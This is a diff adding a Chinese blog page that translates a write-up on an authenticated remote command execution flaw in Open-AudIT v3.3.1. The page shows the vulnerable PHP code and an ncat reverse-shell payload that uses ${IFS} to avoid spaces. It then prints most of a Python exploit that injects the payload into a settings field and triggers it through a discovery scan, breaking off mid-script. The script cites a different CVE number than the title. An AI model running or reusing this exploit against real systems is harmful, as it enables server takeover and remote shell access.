@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="原文链接：https://shells.systems/open-audit-v3-3-1-remote-command-execution-cve-2020-12078/">
+<meta name="keywords" content="看雪翻译小组,WebAssembly">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Open-AudIT v3.3.1远程命令执行（CVE-2020-12078）">
+<meta property="og:url" content="http://yoursite.com/2020/05/26/translate02/index.html">
+<meta property="og:site_name" content="欢歌笑语">
+<meta property="og:description" content="原文链接：https://shells.systems/open-audit-v3-3-1-remote-command-execution-cve-2020-12078/">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/05/26/translate02/exclude-option.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/26/translate02/openit-anything.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/26/translate02/input-test.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/26/translate02/start-discovery.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/26/translate02/openit-logs.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/26/translate02/Openit-executed.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/26/translate02/openAudIT.png">
+<meta property="og:updated_time" content="2020-05-26T13:30:56.847Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Open-AudIT v3.3.1远程命令执行（CVE-2020-12078）">
+<meta name="twitter:description" content="原文链接：https://shells.systems/open-audit-v3-3-1-remote-command-execution-cve-2020-12078/">
+<meta name="twitter:image" content="http://yoursite.com/2020/05/26/translate02/exclude-option.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/05/26/translate02/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Open-AudIT v3.3.1远程命令执行（CVE-2020-12078） | 欢歌笑语</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">欢歌笑语</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">这是一个很好很好的人哦</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/26/translate02/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wangxy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢歌笑语">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Open-AudIT v3.3.1远程命令执行（CVE-2020-12078）
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-05-26 20:00:00 / 修改时间：21:30:56" itemprop="dateCreated datePublished" datetime="2020-05-26T20:00:00+08:00">2020-05-26</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/翻译/" itemprop="url" rel="index"><span itemprop="name">翻译</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>原文链接：<a href="https://shells.systems/open-audit-v3-3-1-remote-command-execution-cve-2020-12078/" target="_blank" rel="noopener">https://shells.systems/open-audit-v3-3-1-remote-command-execution-cve-2020-12078/</a></p>
+</blockquote>
+<a id="more"></a>
+<h2 id="Open-AudIT-概述"><a href="#Open-AudIT-概述" class="headerlink" title="Open-AudIT 概述"></a>Open-AudIT 概述</h2><p>Open-AudIT是一个应用程序，用于准确告诉您网络中的内容，配置方式以及更改时间。Open-AudIT可以运行在Windows和Linux系统。本质上，Open-AudIT是一个信息数据库，可以通过Web界面进行查询。网络有关数据通过Bash脚本（Linux）或VBScript（Windows）插入。整个应用程序用PHP，bash和VBScript编写。这些都是脚本语言-无需编译且人类可读的源代码，进行更改和自定义既快速又容易。</p>
+<h2 id="关于exploit"><a href="#关于exploit" class="headerlink" title="关于exploit"></a>关于exploit</h2><p>我在分析处理软件某些全局设置的函数时发现了漏洞，应程序的逻辑会在将特定选项传递给漏洞函数之前验证是否使用了特定选项。</p>
+<p>通过控制名为<code>excluded IP</code>的全局选项，可以在其中注入恶意命令，之后将恶意命令传递给exec函数并执行。</p>
+<p>经过身份验证的用户可以设置此选项并在其中存储任何值而不会被过滤，这再次意味着我可以控制此值并注入恶意命令。</p>
+<p>在将恶意值注入<code>excluded IP</code>选项之后，我们需要启动发现，该发现将使用预安装的Nmap软件扫描网络，并通过exec函数将<code>excluded IP</code>传递给Nmap来触发注入的payload。</p>
+<p>因此，跟通常一样，启用<a href="https://github.com/mhaskar/RCEScanner" target="_blank" rel="noopener">超级简单的RCE扫描器</a> 脚本，在Open-AudIT中寻找RCE。</p>
+<p>运行脚本后，在<code>discoveries_helper.php</code>文件中得到了有趣的结果。</p>
+<p>discoveries_helper.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">empty</span>($discovery-&gt;attributes-&gt;other-&gt;nmap-&gt;exclude_ip)) &#123;</span><br><span class="line">         </span><br><span class="line">        $command = <span class="string">'nmap -n -sL --exclude '</span> . $discovery-&gt;attributes-&gt;other-&gt;nmap-&gt;exclude_ip . <span class="string">' '</span> . $discovery-&gt;attributes-&gt;other-&gt;subnet;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $command = <span class="string">'nmap -n -sL '</span> . $discovery-&gt;attributes-&gt;other-&gt;subnet;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (php_uname(<span class="string">'s'</span>) === <span class="string">'Darwin'</span>) &#123;</span><br><span class="line">        $command = <span class="string">'/usr/local/bin/'</span> . $command;</span><br><span class="line">    &#125;</span><br><span class="line">$log-&gt;command = $command;</span><br><span class="line">    exec($command, $output, $return_var);</span><br><span class="line">    <span class="keyword">if</span> ($return_var === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($output <span class="keyword">as</span> $line) &#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($line, <span class="string">'Nmap scan report for'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                $temp = explode(<span class="string">' '</span>, $line);</span><br><span class="line">                $ip_addresses[] = $temp[<span class="number">4</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到在#86行，名为$command的变量传递给exec函数，在#77行，如果<code>excluded IP</code>非空，则将<code>excluded IP</code>的值和Nmap主命令拼接在一起。</p>
+<p>该代码在<code>all_ip_list</code>函数中，该函数将在我们执行发现扫描时触发。</p>
+<p>要知道实际上如何处理<code>excluded IP</code>变量，我们必须看一下以下代码：</p>
+<p>discoveries_helper.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>($CI-&gt;config-&gt;config[<span class="string">'discovery_ip_exclude'</span>])) &#123;</span><br><span class="line">    <span class="comment">// Account for users adding multiple spaces which would be converted to multiple comma's.</span></span><br><span class="line">    $exclude_ip = preg_replace(<span class="string">'!\s+!'</span>, <span class="string">' '</span>, $CI-&gt;config-&gt;config[<span class="string">'discovery_ip_exclude'</span>]);</span><br><span class="line">    <span class="comment">// Convert spaces to comma's</span></span><br><span class="line">    $exclude_ip = str_replace(<span class="string">' '</span>, <span class="string">','</span>, $exclude_ip);</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">empty</span>($discovery-&gt;attributes-&gt;other-&gt;nmap-&gt;exclude_ip)) &#123;</span><br><span class="line">        $discovery-&gt;attributes-&gt;other-&gt;nmap-&gt;exclude_ip .= <span class="string">','</span> . $exclude_ip;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $discovery-&gt;attributes-&gt;other-&gt;nmap-&gt;exclude_ip = $exclude_ip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该代码将获取<code>discovery_ip_exclude</code>选项的值并将其设置为<code>exclude_ip</code>值；稍后，我们将返回此代码以查看其如何处理<code>exclude_ip</code>值。</p>
+<p>在深入研究代码后，我发现值<code>discovery_ip_exclude</code>由以下页面处理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP/en/omk/open-audit/configuration?configuration.name=likediscovery_</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/26/translate02/exclude-option.png" alt=""></p>
+<p>然后我们可以编辑<code>discovery_ip_exclude</code>的值：</p>
+<p><img src="/2020/05/26/translate02/openit-anything.png" alt=""></p>
+<p>所以基于我们目前发现，这个值将会在启动发现扫描时被使用，因此让我们通过创建新发现并启动它。</p>
+<blockquote>
+<p>该值是通过PATCH请求发送的，我们稍后将在漏洞利用代码中进行处理</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/en/omk/open-audit/discoveries/create</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/26/translate02/input-test.png" alt=""></p>
+<p>创建之后会有如下结果：</p>
+<p><img src="/2020/05/26/translate02/start-discovery.png" alt=""></p>
+<p>现在启动扫描，结果如下：</p>
+<p><img src="/2020/05/26/translate02/openit-logs.png" alt=""></p>
+<p>正如我们所料，实现了命令注入。但是命令里的空格被替换了，我们回到之前的代码来理解这一点。</p>
+<p>discoveries_helper.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>($CI-&gt;config-&gt;config[<span class="string">'discovery_ip_exclude'</span>])) &#123;</span><br><span class="line">    <span class="comment">// Account for users adding multiple spaces which would be converted to multiple comma's.</span></span><br><span class="line">    $exclude_ip = preg_replace(<span class="string">'!\s+!'</span>, <span class="string">' '</span>, $CI-&gt;config-&gt;config[<span class="string">'discovery_ip_exclude'</span>]);</span><br><span class="line">    <span class="comment">// Convert spaces to comma's</span></span><br><span class="line">    $exclude_ip = str_replace(<span class="string">' '</span>, <span class="string">','</span>, $exclude_ip);</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">empty</span>($discovery-&gt;attributes-&gt;other-&gt;nmap-&gt;exclude_ip)) &#123;</span><br><span class="line">        $discovery-&gt;attributes-&gt;other-&gt;nmap-&gt;exclude_ip .= <span class="string">','</span> . $exclude_ip;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $discovery-&gt;attributes-&gt;other-&gt;nmap-&gt;exclude_ip = $exclude_ip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到在#279行，将空格替换为<code>,</code>，意味着在payload中不能有空格。</p>
+<h2 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h2><p>因此，在无问题地注入命令后，我们将尝试编写没有空格的payload。</p>
+<p>我想到的第一个点是使用<code>${IFS}</code>代替<a href="https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/" target="_blank" rel="noopener">上一篇文章</a>中的空格，并且转义该命令，我们可以简单地使用“;”编写以下payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;My$&#123;IFS&#125;Payload;</span><br></pre></td></tr></table></figure>
+<p>使用Netcat实现反向shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;ncat$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash$&#123;IFS&#125;10.0.0.1$&#123;IFS&#125;1337$&#123;IFS&#125;;</span><br></pre></td></tr></table></figure>
+<p>我们转义了该命令，用<code>${IFS}</code>代替了空格，一切都应该正常工作。</p>
+<p>要执行命令，我们需要执行以下操作：</p>
+<ul>
+<li>将全局设置<code>discovery_ip_exclude</code>更改为我们的payload</li>
+<li>开启正常发现扫描</li>
+</ul>
+<p>并且，当我们开启正常发现扫描时，软件将检查<code>discovery_ip_exclude</code>是否不为空，然后将其传递给exec函数，如我之前所述。</p>
+<p>执行完前面的步骤后，应该得到以下内容：</p>
+<p><img src="/2020/05/26/translate02/Openit-executed.png" alt=""></p>
+<p>我们执行了命令，然后弹出了一个shell。</p>
+<h2 id="编写exploit"><a href="#编写exploit" class="headerlink" title="编写exploit"></a>编写exploit</h2><p>为了自动化利用过程，我编写了一个python脚本来处理登录，然后更改全局设置并将payload注入<code>discovery_ip_exclude</code>选项中，最后创建并开启新的发现扫描。</p>
+<p>在编写漏洞利用程序期间，我必须处理一些CSRF问题，还必须处理PATCH请求，并可能在尝试添加<code>discovery_ip_exclude</code>选项时将其发送。</p>
+<p>另外，我还必须注意其他问题，如创建唯一的扫描名称、自动检索创建的发现扫描以及代码中可以看到的许多其他内容。</p>
+<p>这是最终代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Exploit Title: Open-AudIT v3.3.1 Professional Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 22/04/2020</span></span><br><span class="line"><span class="comment"># Exploit Author: Askar (@mohammadaskar2)</span></span><br><span class="line"><span class="comment"># CVE: CVE-2020-8813</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://opmantek.com/</span></span><br><span class="line"><span class="comment"># Version: v3.3.1</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 18.04 / PHP 7.2.24</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"> </span><br><span class="line">warnings.filterwarnings(<span class="string">"ignore"</span>, category=UserWarning, module=<span class="string">'bs4'</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">6</span>:</span><br><span class="line">    print(<span class="string">"[~] Usage : ./openaudit-exploit.py url username password ip port"</span>)</span><br><span class="line">    exit()</span><br><span class="line"> </span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">username = sys.argv[<span class="number">2</span>]</span><br><span class="line">password = sys.argv[<span class="number">3</span>]</span><br><span class="line">ip = sys.argv[<span class="number">4</span>]</span><br><span class="line">port = sys.argv[<span class="number">5</span>]</span><br><span class="line"> </span><br><span class="line">request = requests.session()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_payload</span><span class="params">()</span>:</span></span><br><span class="line">    configuration_path = url+<span class="string">"/en/omk/open-audit/configuration/90"</span></span><br><span class="line">    <span class="comment"># data = "payload=&#123;'expt_name' : 'A60E001', 'status' : 'done' &#125;"</span></span><br><span class="line">    data = <span class="string">'data=&#123;"data":&#123;"id":"90","type":"configuration","attributes":&#123;"value":";ncat$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash$&#123;IFS&#125;%s$&#123;IFS&#125;%s$&#123;IFS&#125;;"&#125;&#125;&#125;'</span> % (ip, port)</span><br><span class="line">    request.patch(configuration_path, data)</span><br><span class="line">    print(<span class="string">"[+] Payload injected in settings"</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_discovery</span><span class="params">()</span>:</span></span><br><span class="line">    discovery_path = url+<span class="string">"/en/omk/open-audit/discoveries/create"</span></span><br><span class="line">    post_discovery_path = url+<span class="string">"/en/omk/open-audit/discoveries"</span></span><br><span class="line">    scan_name = <span class="string">""</span>.join([random.choice(string.ascii_uppercase) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line">    req = request.get(discovery_path)</span><br><span class="line"> </span><br><span class="line">    response = req.text</span><br><span class="line">    soup = BeautifulSoup(response, <span class="string">"html5lib"</span>)</span><br><span class="line">    token = soup.findAll(<span class="string">'input'</span>)[<span class="number">5</span>].get(<span class="string">"value"</span>)</span><br><span class="line">    buttons = soup.findAll(<span class="string">"button"</span>)</span><br><span class="line">    headers = &#123;<span class="string">"Referer"</span> : discovery_path&#125;</span><br><span class="line">    request_data = &#123;</span><br><span class="line">    <span class="string">"data[attributes][name]"</span>:scan_name,</span><br><span class="line">    <span class="string">"data[attributes][other][subnet]"</span>:<span class="string">"10.10.10.1/24"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][ad_server]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][ad_domain]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"submit"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[type]"</span>:<span class="string">"discoveries"</span>,</span><br><span class="line">    <span class="string">"data[access_token]"</span>:token,</span><br><span class="line">    <span class="string">"data[attributes][complete]"</span>:<span class="string">"y"</span>,</span><br><span class="line">    <span class="string">"data[attributes][org_id]"</span>:<span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"data[attributes][type]"</span>:<span class="string">"subnet"</span>,</span><br><span class="line">    <span class="string">"data[attributes][devices_assigned_to_org]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][devices_assigned_to_location]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][discovery_scan_option_id]"</span>:<span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][ping]"</span>:<span class="string">"y"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][service_version]"</span>:<span class="string">"n"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][open|filtered]"</span>:<span class="string">"n"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][filtered]"</span>:<span class="string">"n"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][timing]"</span>:<span class="string">"4"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][nmap_tcp_ports]"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][nmap_udp_ports]"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][tcp_ports]"</span>:<span class="string">"22,135,62078"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][udp_ports]"</span>:<span class="string">"161"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][timeout]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][exclude_tcp_ports]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][exclude_udp_ports]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][exclude_ip]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][nmap][ssh_ports]"</span>:<span class="string">"22"</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_dbus]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_fqdn]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_dns_fqdn]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_dns_hostname]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_hostname]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_hostname_dbus]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_hostname_serial]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_hostname_uuid]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_ip]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_ip_no_data]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_mac]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_mac_vmware]"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="string">"data[attributes][other][match][match_serial]"</span>:<span 